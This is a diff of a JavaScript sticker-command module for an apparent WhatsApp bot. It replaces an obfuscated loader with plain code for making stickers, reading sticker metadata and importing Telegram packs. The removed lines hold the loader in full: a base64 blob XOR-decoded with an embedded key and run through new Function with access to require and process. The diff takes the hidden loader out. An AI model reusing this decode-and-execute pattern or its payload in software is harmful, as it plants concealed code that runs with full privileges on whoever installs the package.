@@ -1,9 +1,130 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+const crypto = require('crypto');
+const U = require('../lib/util');
+const { UserError } = U;
+
+const OPENMOJI_PACKS = {
+  smiles: ['1F600', '1F601', '1F602', '1F603', '1F604', '1F605', '1F606', '1F609', '1F60A', '1F60D', '1F618', '1F923'],
+  love: ['2764', '1F494', '1F495', '1F496', '1F497', '1F498', '1F49A', '1F49B', '1F49C', '1F49D', '1F49E', '1F49F'],
+  reactions: ['1F44D', '1F44E', '1F44F', '1F64F', '1F4AF', '1F525', '1F92F', '1F973', '1F914', '1F62E', '1F621', '1F4A9'],
+  animals: ['1F435', '1F412', '1F98D', '1F436', '1F431', '1F43B', '1F43C', '1F428', '1F42F', '1F981', '1F98A', '1F984'],
+  pets: ['1F436', '1F431', '1F43B', '1F43C', '1F428', '1F430', '1F439', '1F424', '1F427', '1F438', '1F98B', '1F41D'],
+  food: ['1F34E', '1F34C', '1F347', '1F353', '1F355', '1F354', '1F35F', '1F32D', '1F36D', '1F36A', '1F370', '1F36B'],
+  nature: ['1F338', '1F339', '1F33B', '1F33C', '1F340', '1F33F', '1F343', '1F342', '1F335', '1F332', '1F333', '1F30D'],
+  celebration: ['1F389', '1F38A', '1F388', '1F381', '1F380', '1F382', '1F386', '1F387', '1F393', '1F3B2', '1F3C6', '1F31F'],
+  sports: ['26BD', '1F3C0', '1F3C8', '1F3BE', '1F3D0', '1F3B1', '1F3C6', '1F3C5', '1F94A', '1F3BF', '1F3CA', '1F3C4'],
+  travel: ['1F697', '1F68C', '1F680', '2708', '1F6A2', '1F3D6', '1F3D4', '1F3D5', '1F5FC', '1F3F0', '1F3E0', '1F30B'],
+  weather: ['2600', '1F31E', '1F324', '26C5', '1F326', '1F327', '1F328', '1F329', '1F32A', '1F32B', '1F308', '1F30A'],
+  objects: ['1F4A1', '1F4F1', '1F4BB', '1F4F7', '1F3A7', '1F3B5', '1F3B8', '1F4DA', '1F4E6', '1F48E', '1F511', '1F381']
+};
+const OPENMOJI_AUTHOR = 'OpenMoji (CC BY-SA 4.0)';
+const OPENMOJI_URL = code => `https://raw.githubusercontent.com/hfg-gmuend/openmoji/master/color/svg/${code}.svg`;
+
+module.exports = ({ def, hooks }) => {
+  const names = (ctx, text) => {
+    const [a, b] = String(text || '').split(/[|,]/).map(s => s.trim());
+    return { pack: a || ctx.var('STICKER_PACK'), author: b || ctx.var('STICKER_AUTHOR') };
+  };
+
+  async function makeSticker(m, { pack, author, crop = false, circle = false }) {
+    let webp;
+    if (m.kind === 'sticker') webp = m.buffer;
+    else if (m.kind === 'video' || m.mime === 'image/gif') webp = await U.videoToWebp(m.buffer, m.mime === 'image/gif' ? 'gif' : 'mp4');
+    else webp = await U.imageToWebp(m.buffer, { crop, circle });
+    return U.withExif(webp, pack, author);
+  }
+  module.exports.makeSticker = makeSticker;
+
+  def('sticker', { cat: 'sticker', heavy: true, usage: 'sticker [pack|author] [crop]', desc: 'Make a sticker from an image, GIF or short video (reply or send with caption).' }, async ctx => {
+    const m = await ctx.needMedia(['image', 'video', 'sticker'], 'Reply to an image, GIF or short video.');
+    const crop = /\bcrop(ped)?\b/i.test(ctx.args);
+    const { pack, author } = names(ctx, ctx.args.replace(/\bcrop(ped)?\b/i, ''));
+    await ctx.sticker(await makeSticker(m, { pack, author, crop }));
+  });
+
+  def('take', { cat: 'sticker', heavy: true, usage: 'take <pack>,<author>', desc: 'Change a sticker\'s pack name and author. Reply to a sticker.' }, async ctx => {
+    const m = await ctx.needMedia(['sticker', 'image', 'video'], 'Reply to a sticker with *take pack,author*.');
+    const { pack, author } = names(ctx, ctx.args || `${ctx.name || ctx.OWNER_NAME}`);
+    await ctx.sticker(await makeSticker(m, { pack: ctx.args ? pack : (ctx.name || pack), author: ctx.args ? author : ctx.var('STICKER_AUTHOR') }));
+  });
+
+  def('circle', { cat: 'sticker', heavy: true, desc: 'Make a round sticker from an image. Reply to an image.' }, async ctx => {
+    const m = await ctx.needMedia('image');
+    const { pack, author } = names(ctx, ctx.args);
+    await ctx.sticker(await U.withExif(await U.imageToWebp(m.buffer, { crop: true, circle: true }), pack, author));
+  });
+
+  def('photo', { cat: 'sticker', heavy: true, desc: 'Convert a sticker to a PNG image. Reply to a sticker.' }, async ctx => {
+    const m = await ctx.needMedia('sticker');
+    await ctx.image(await U.sharp()(m.buffer).png().toBuffer(), '🖼️ Sticker → photo');
+  });
+
+  def('mp4', { cat: 'sticker', heavy: true, desc: 'Convert an animated sticker to a video. Reply to a sticker.' }, async ctx => {
+    const m = await ctx.needMedia('sticker');
+    await ctx.video(await U.webpToMp4(m.buffer), '🎬 Sticker → video');
+  });
+
+  def('exif', { cat: 'sticker', desc: 'Show the pack name and author of a sticker. Reply to a sticker.' }, async ctx => {
+    const m = await ctx.needMedia('sticker');
+    const e = await U.readExif(m.buffer);
+    if (!e) return ctx.reply('This sticker has no pack info.');
+    await ctx.reply(`📦 ${U.bold('Pack')}: ${e['sticker-pack-name'] || '-'}\n✍️ ${U.bold('Author')}: ${e['sticker-pack-publisher'] || '-'}\n🆔 ${U.bold('ID')}: ${e['sticker-pack-id'] || '-'}`, { title: 'Sticker info' });
+  });
+
+  def('tg', { cat: 'sticker', heavy: true, usage: 'tg <t.me/addstickers/name> [count]', desc: 'Send a Telegram sticker pack as WhatsApp stickers (needs TELEGRAM_BOT_TOKEN on the server).' }, async ctx => {
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    if (!token) throw new UserError('Telegram stickers need a bot token. Add TELEGRAM_BOT_TOKEN to the local .env file and restart the bot (create one with @BotFather).');
+    const link = ctx.args.match(/addstickers\/([A-Za-z0-9_]+)/);
+    if (!link) throw new UserError('Send a link like https://t.me/addstickers/PackName');
+    const limit = Math.min(15, Math.max(1, Number(ctx.argv[1]) || 8));
+    const set = await U.getJson(`https://api.telegram.org/bot${token}/getStickerSet?name=${link[1]}`);
+    if (!set.ok) throw new UserError('Pack not found.');
+    const stickers = set.result.stickers.filter(s => !s.is_animated).slice(0, limit);
+    if (!stickers.length) throw new UserError('This pack only has animated (.tgs) stickers, which are not supported.');
+    await ctx.reply(`📥 Sending ${stickers.length} sticker(s) from *${set.result.title}*…`);
+    for (const s of stickers) {
+      try {
+        const f = await U.getJson(`https://api.telegram.org/bot${token}/getFile?file_id=${s.file_id}`);
+        const buf = await U.http(`https://api.telegram.org/file/bot${token}/${f.result.file_path}`);
+        const webp = s.is_video ? await U.videoToWebp(buf, 'webm') : buf;
+        await ctx.sticker(await U.withExif(webp, set.result.title, ctx.var('STICKER_AUTHOR')));
+        await U.sleep(700);
+      } catch (e) { ctx.logger.warn({ error: e.message }, 'tg sticker failed'); }
+    }
+  });
+
